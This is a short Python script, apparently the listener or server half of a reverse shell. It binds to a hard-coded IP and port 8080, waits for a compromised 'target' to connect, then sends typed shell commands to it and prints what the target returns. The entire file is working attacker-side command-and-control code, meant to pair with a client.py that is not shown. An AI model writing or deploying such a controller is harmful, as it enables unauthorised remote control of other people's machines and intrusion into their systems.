##import required modules
import socket  # for building TCP connection
import os

os.system("clear || cls")  # it clears the terminal screen

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # start a socket object 's'
    s.bind(('10.18.142.137', 8080))  # define the IP address and the listening port.  which is same as defined in client.py

    s.listen(1)  # for listening from  single connection so make it one

    print('[+] Listening for incoming TCP connection on port 8080')
    conn, addr = s.accept()  # accept() function will return the connection object ID (conn) and will return the client(target IP address and source

    print('[+] We got a connection from: ', addr)

    ter = 'terminate'

    while True:
        command = input("\nShell> ")  # Get user input and store it in command variable
        if ter in command:  # If we type terminate command, so close the connection and break the loop
            conn.send(ter.encode('utf-8'))
            conn.close()
            break
        else:
            conn.send(str.encode(command))  # here we will send the command to the target
            client = str(conn.recv(1024).decode("utf-8"))
            print(client)  # and print the result that we got back







def main():
    connect()


main()
